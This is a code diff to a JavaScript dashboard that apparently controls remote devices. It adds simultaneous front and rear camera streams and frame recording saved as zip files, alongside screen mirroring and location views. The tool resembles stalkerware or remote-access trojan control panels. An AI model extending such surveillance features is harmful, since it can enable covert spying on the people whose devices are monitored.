@@ -31,7 +31,7 @@ function connect() {
         } else if (data.type === 'audio') {
             displayAudio(data.audio);
         } else if (data.type === 'camera') {
-            displayCamera(data.image);
+            displayCamera(data.image, data.camera);
         }
     };
     
@@ -61,6 +61,11 @@ function renderDevices() {
     `).join('');
 }
 
+let frontFrames = [];
+let rearFrames = [];
+let isRecordingFront = false;
+let isRecordingRear = false;
+
 function selectDevice(id) {
     selectedDevice = devices.find(d => d.id === id);
     showTab('monitor');
@@ -68,16 +73,18 @@ function selectDevice(id) {
         <h3>${selectedDevice.name}</h3>
         <div class="monitor-grid">
             <div class="monitor-box">
+                <h4>📷 Front Camera</h4>
+                <div id="frontCameraView" class="view">Connecting...</div>
+                <button onclick="toggleRecording('front')" id="frontRecBtn">⏺️ Record</button>
+            </div>
+            <div class="monitor-box">
+                <h4>📷 Rear Camera</h4>
+                <div id="rearCameraView" class="view">Connecting...</div>
+                <button onclick="toggleRecording('rear')" id="rearRecBtn">⏺️ Record</button>
+            </div>
+            <div class="monitor-box">
                 <h4>Screen Mirror</h4>
                 <div id="screenView" class="view">Connecting...</div>
-            </div>
-            <div class="monitor-box">
-                <h4>Camera</h4>
-                <div id="cameraView" class="view">Connecting...</div>
-            </div>
-            <div class="monitor-box">
-                <h4>Microphone</h4>
-                <div id="audioView" class="view">Connecting...</div>
             </div>
             <div class="monitor-box">
                 <h4>Location</h4>
@@ -88,6 +95,8 @@ function selectDevice(id) {
             </div>
         </div>
     `;
+    startCamera('front');
+    startCamera('rear');
 }
 
 function startScreen() {
@@ -108,8 +117,62 @@ function startCamera(type) {
     }
 }
 
-function displayCamera(image) {
-    document.getElementById('cameraView').innerHTML = `<img src="${image}" style="width:100%;height:auto;">`;
+function displayCamera(image, camera) {
+    const viewId = camera === 'front' ? 'frontCameraView' : 'rearCameraView';
+    const view = document.getElementById(viewId);
+    if (view) {
+        view.innerHTML = `<img src="${image}" style="width:100%;height:auto;">`;
+        if (camera === 'front' && isRecordingFront) frontFrames.push(image);
+        if (camera === 'rear' && isRecordingRear) rearFrames.push(image);
+    }
+}
+
+function toggleRecording(camera) {
+    if (camera === 'front') {
+        isRecordingFront = !isRecordingFront;
+        const btn = document.getElementById('frontRecBtn');
+        if (isRecordingFront) {
+            frontFrames = [];
+            btn.textContent = '⏹️ Stop';
+            btn.style.background = '#f44336';
+        } else {
+            btn.textContent = '⏺️ Record';
+            btn.style.background = '';
+            downloadRecording(frontFrames, 'front');
+        }
+    } else {
+        isRecordingRear = !isRecordingRear;
+        const btn = document.getElementById('rearRecBtn');
+        if (isRecordingRear) {
+            rearFrames = [];
+            btn.textContent = '⏹️ Stop';
+            btn.style.background = '#f44336';
+        } else {
+            btn.textContent = '⏺️ Record';
+            btn.style.background = '';
+            downloadRecording(rearFrames, 'rear');
+        }
+    }
+}
+
+async function downloadRecording(frames, camera) {
+    if (frames.length === 0) return alert('No frames recorded');
+    
+    const zip = await import('https://cdn.jsdelivr.net/npm/jszip@3.10.1/+esm');
+    const JSZip = zip.default;
+    const zipFile = new JSZip();
+    
+    frames.forEach((frame, i) => {
+        const base64 = frame.split(',')[1];
+        zipFile.file(`frame_${i.toString().padStart(4, '0')}.jpg`, base64, {base64: true});
+    });
+    
+    const blob = await zipFile.generateAsync({type: 'blob'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `${camera}_camera_${Date.now()}.zip`;
+    a.click();
 }
 
 function displayScreen(image) {
